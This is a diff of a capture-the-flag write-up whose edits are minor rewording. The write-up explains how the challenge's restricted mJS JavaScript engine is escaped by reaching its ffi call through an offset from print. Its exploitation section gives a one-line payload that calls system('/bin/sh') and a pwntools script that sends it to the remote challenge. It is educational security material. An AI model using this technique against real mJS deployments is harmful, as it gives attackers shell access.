@@ -13,7 +13,7 @@ It took a bit to figure out the inner structures, how they worked together, and 
 However, once I figured out where to look at, the challenge became pretty straight forward and even seemed easy.
 
 ## Analysis
-This challenge seems to be using a restricted javascript engine to restrict API calls so I took a look at the repository.
+This challenge seems to be using a restricted javascript engine to restrict API calls, so I took a look at the repository to see which calls are allowed.
 These are the API calls I can utilize. 
 ```
 print(arg1, arg2, ...);
@@ -33,14 +33,14 @@ let f = ffi('int foo(int)');
 gc(full);
 ```
 
-Unzipping the challenge file gives a python code that takes in user input and opens a subprocess ```./mjs``` and executes the input as a javascript code.
+Unzipping the challenge file gives a python code that runs on the server that takes in user input and opens a subprocess ```./mjs``` and executes the input as a javascript code.
 
 The usage of the mjs binary locally looks like:
 ```
 ./mjs ./test.js
 ```
 where test.js is the javascript file that I want to execute locally.
-So if my test.js looks like 
+So if my test.js looks like this:
 ```
 function hello() {
     print("hello world");
@@ -49,7 +49,7 @@ function hello() {
 hello();
 1;
 ```
-Then the output will look like
+Then the output will look like:
 ```
 hello world
 1
@@ -149,14 +149,14 @@ And within gdb, print is mjs_print and ffi is mjs_ffi_call, I figured out their 
 I cannot call ffi directly, but I can call ffi using ```(print + offset)```, which I believe is the intended vuln. And I can calculate offset using gdb.
 
 ## Exploitation
-The explotation is fairly simple, as we only have to call ffi using the right offset and the right calling convention, which was tricky to figure it out.
+The explotation is fairly simple, as we only have to call ffi using the right offset and the right calling convention, which was a bit tricky to figure out.
 
 But locally, we just need one line:
 ```
 (print + 0x6ab0)('int system(char *)')('/bin/sh');
 ```
 
-And for remote, we just supply "EOF" at the end.
+And for remote, we just supply "EOF" at the end to run.
 ```
 #!/usr/bin/python3
 from pwn import *
@@ -176,13 +176,13 @@ sla('End with "EOF":\n', "print((print + 0x6ab0)('int system(char *)')('/bin/sh'
 
 p.interactive()
 ```
-That is it. 
+One line is all we need. 
 
 ## Notes
-The exploitation logic isn't that complex. To solve this challenge, I had to learn some basic javascript and what to expect in terms of how the server behaves relating to my requests.
+The exploitation logic isn't that complex. To solve this challenge, I had to learn some basic javascript and what to expect in terms of how the server behaves relating to my requests- which I believe is the fundamentals of web browser exploitation.
 
-I think this was a fairly neat challenge for web browser exploit beginners. It also reminded me of seccomp and sandbox escaping challenges.
+I think this was a fairly neat challenge for beginners of web browser exploitation. It also reminded me of seccomp and sandbox escaping challenges.
 
-Thank you,
+Thank you!
 
 079
